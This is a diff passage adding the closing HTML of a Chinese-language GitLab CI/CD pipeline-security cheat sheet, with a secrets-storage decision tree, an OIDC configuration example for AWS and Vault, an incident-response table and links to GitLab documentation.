+│  └─ 沒 Vault
+│     └─ UI Variables(masked + protected + environment scope)
+│
+├─ 檔案類(keystore、SSL cert)
+│  └─ Secure Files
+│
+└─ 雲端身分驗證
+   └─ OIDC(不要用長期 key)</code></pre>
+
+    <h3 class="depth">🛡️ OIDC 速查</h3>
+    <pre><code>job:
+  id_tokens:
+    AWS_TOKEN:
+      aud: https://aws.amazon.com
+    VAULT_TOKEN:
+      aud: https://vault.example.com
+  secrets:
+    DB_PASS:
+      vault: prod/db/password@ops
+      file: false
+      token: $VAULT_TOKEN
+  script:
+    # 用 AWS_TOKEN 換 STS credential
+    - aws sts assume-role-with-web-identity \
+        --role-arn $ROLE \
+        --role-session-name ci-$CI_JOB_ID \
+        --web-identity-token $AWS_TOKEN</code></pre>
+
+    <h3 class="depth">🆘 安全事故應變</h3>
+    <table>
+      <tr><th>事故</th><th>立即動作</th></tr>
+      <tr><td>Secret push 到 repo</td><td>1. 撤銷 token 2. 輪替 3. 最後才清 Git 歷史</td></tr>
+      <tr><td>CI_JOB_TOKEN 疑似洩漏</td><td>該 pipeline 已結束即過期,但重看 Audit</td></tr>
+      <tr><td>Fork MR 可能偷了 secret</td><td>撤銷所有 parent secret、清查 audit</td></tr>
+      <tr><td>Runner 被攻破</td><td>下線 runner、輪替 token、重建</td></tr>
+      <tr><td>惡意 Component 被 include</td><td>移除 include、清查影響、開事故報告</td></tr>
+    </table>
+
+    <h3 class="depth">📚 延伸閱讀</h3>
+    <ul>
+      <li>Pipeline Security:<code>docs.gitlab.com/ci/pipeline_security/</code></li>
+      <li>External Secrets:<code>docs.gitlab.com/ci/secrets/</code></li>
+      <li>Vault 整合:<code>docs.gitlab.com/ci/secrets/hashicorp_vault/</code></li>
+      <li>Secret Detection:<code>docs.gitlab.com/user/application_security/secret_detection/</code></li>
+      <li>Secure Files:<code>docs.gitlab.com/ci/secure_files/</code></li>
+      <li>CI_JOB_TOKEN:<code>docs.gitlab.com/ci/jobs/ci_job_token/</code></li>
+    </ul>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <p>GitLab CI/CD Cheat Sheet 系列 8/14 · 來源:<a href="https://docs.gitlab.com/ci/pipeline_security/" target="_blank">docs.gitlab.com/ci/pipeline_security/</a></p>
+  <p>本文件為中文摘要與實務補充,非 GitLab 官方翻譯。請以官網最新版本為準。</p>
+</footer>
+
+</body>
+</html>
